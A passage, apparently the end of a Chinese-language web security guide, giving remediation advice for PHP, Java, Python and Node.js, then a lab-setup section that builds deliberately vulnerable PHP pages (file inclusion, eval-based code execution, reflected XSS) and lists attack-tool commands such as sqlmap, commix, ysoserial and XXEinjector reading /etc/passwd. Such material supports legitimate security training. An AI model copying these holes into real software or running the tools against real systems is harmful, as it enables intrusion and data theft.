- JavaScript输出使用JavaScript编码

**安全配置**：
- 禁用危险的PHP配置：`allow_url_include=Off`, `disable_functions=system,exec`等
- 正确配置Java安全设置：禁用外部实体，使用安全的反序列化
- 限制文件上传：验证文件类型，使用随机文件名
- 配置适当的访问控制：最小权限原则

**安全编码实践**：
- 使用安全的函数和API
- 避免使用危险的函数：`eval()`, `assert()`, `system()`等
- 使用预处理语句处理SQL
- 使用安全的序列化格式：JSON替代pickle

**安全架构**：
- 实施分层安全架构
- 使用防火墙和WAF
- 实施网络隔离
- 定期安全审计和渗透测试

### 14.2 语言特定修复建议

**PHP**：
- 使用PDO或mysqli预处理语句
- 启用`open_basedir`限制
- 禁用`allow_url_include`
- 配置`disable_functions`禁用危险函数
- 使用`htmlspecialchars()`处理输出

**Java**：
- 使用PreparedStatement处理SQL
- 禁用XML外部实体：`dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);`
- 使用安全的反序列化：`ValidatingObjectInputStream`
- 对上传文件进行严格验证
- 使用`HttpServletRequest.encodeURL()`处理URL

**Python**：
- 避免使用`eval()`和`exec()`
- 使用`json`替代`pickle`进行序列化
- 使用`yaml.safe_load()`替代`yaml.load()`
- 对模板输入进行严格验证
- 使用`subprocess.run()`替代`subprocess.Popen()`

**JavaScript/Node.js**：
- 使用参数化查询处理SQL
- 使用安全的模板引擎
- 实施内容安全策略（CSP）
- 对输入进行严格验证
- 使用`helmet`等安全中间件

## 15. 漏洞环境搭建指南

### 15.1 本地环境搭建

**SQL注入环境**：
```bash
# 使用Docker快速搭建
docker run -d -p 8080:80 vulnerables/web-dvwa
# 访问 http://localhost:8080，默认账号密码：admin/password
```

**文件包含环境**：
```bash
# 创建测试文件
mkdir -p /var/www/html
cat > /var/www/html/include.php << 'EOF'
<?php
$file = $_GET['file'];
include($file);
?>
EOF
# 启动PHP内置服务器
php -S 0.0.0.0:8000 -t /var/www/html
```

**RCE环境**：
```bash
# 创建测试文件
cat > /var/www/html/rce.php << 'EOF'
<?php
$code = $_GET['code'];
eval($code);
?>
EOF
# 启动PHP内置服务器
php -S 0.0.0.0:8000 -t /var/www/html
```

**XSS环境**：
```bash
# 创建测试文件
cat > /var/www/html/xss.php << 'EOF'
<?php
$name = $_GET['name'];
echo "Hello, $name";
?>
EOF
# 启动PHP内置服务器
php -S 0.0.0.0:8000 -t /var/www/html
```

### 15.2 漏洞验证工具

**SQL注入**：
- SQLmap：`sqlmap -u "http://example.com/user.php?id=1" --dbs`
- NoSQLmap：针对NoSQL注入

**文件包含**：
- Fimap：`fimap -u "http://example.com/include.php?file=index.php"`

**RCE**：
- Commix：`commix -u "http://example.com/rce.php?code=1"`

**XSS**：
- XSStrike：`python xsstrike.py -u "http://example.com/xss.php?name=test"`

**反序列化**：
- ysoserial：`java -jar ysoserial.jar CommonsCollections9 "cmd" > payload.bin`
- PHP反序列化工具：`phpggc`

**XXE**：
- XXEinjector：`python XXEinjector.py --host=http://example.com/xxe --file=/etc/passwd`

**SSRF**：
- SSRFmap：`python ssrfmap.py -u "http://example.com/ssrf?url=test" --gopher --redis`

## 16. 总结

本文档提供了详细的漏洞攻击链分析、具体攻击步骤和完整的POC内容，涵盖了Web应用中常见的各种漏洞类型。这些内容可以帮助安全人员和开发人员更好地理解漏洞的原理和攻击方式，从而采取有效的防护措施。

在实际应用中，应根据具体的技术栈和业务场景，结合本文档提供的修复建议，实施全面的安全防护措施。同时，定期进行安全审计和渗透测试，及时发现和修复潜在的安全漏洞，确保系统的安全性。
